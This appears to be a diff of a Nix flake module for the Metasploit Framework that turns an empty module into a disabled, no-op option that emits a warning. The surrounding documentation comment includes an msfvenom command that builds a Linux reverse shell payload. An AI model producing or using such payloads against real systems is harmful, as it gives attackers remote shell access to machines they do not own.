@@ -20,9 +20,40 @@
     * `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf > shell.elf` — Craft a reverse shell payload.
 */
 
-{
-  flake.nixosModules.apps.metasploit = _: {
-    # Intentionally empty: metasploit stays in the pentesting devshell only.
-  };
+_:
+let
+  MetasploitModule =
+    {
+      config,
+      lib,
+      ...
+    }:
+    let
+      cfg = config.programs.metasploit.extended;
+    in
+    {
+      options.programs.metasploit.extended = {
+        enable = lib.mkOption {
+          type = lib.types.bool;
+          default = false; # Explicitly disabled
+          description = lib.mdDoc ''
+            Whether to enable Metasploit Framework.
 
+            NOTE: This option exists for consistency but does nothing.
+            Metasploit is available in the pentesting devshell only.
+            See devshell configuration for actual metasploit access.
+          '';
+        };
+      };
+
+      config = lib.mkIf cfg.enable {
+        # Intentionally empty: metasploit stays in the pentesting devshell only.
+        warnings = [
+          "programs.metasploit.extended is a no-op. Use the pentesting devshell instead."
+        ];
+      };
+    };
+in
+{
+  flake.nixosModules.apps.metasploit = MetasploitModule;
 }
